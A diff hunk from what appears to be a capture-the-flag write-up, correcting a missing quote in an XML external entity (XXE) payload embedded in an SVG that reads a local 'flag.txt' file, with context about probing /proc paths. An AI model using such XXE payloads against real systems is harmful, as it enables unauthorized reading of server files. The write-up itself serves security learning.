@@ -45,7 +45,7 @@ The process id was 28. Hence, I tried `/proc/28/cwd/flag.txt` , nope no luck. Ap
 Then suddenly, we crafted a payload
 
 ```xml
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:flag.txt> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:flag.txt"> ]>
 <svg height="300" width="3000">
   <text x="0" y="15" fill="red">test &xxe; test</text>
 </svg>
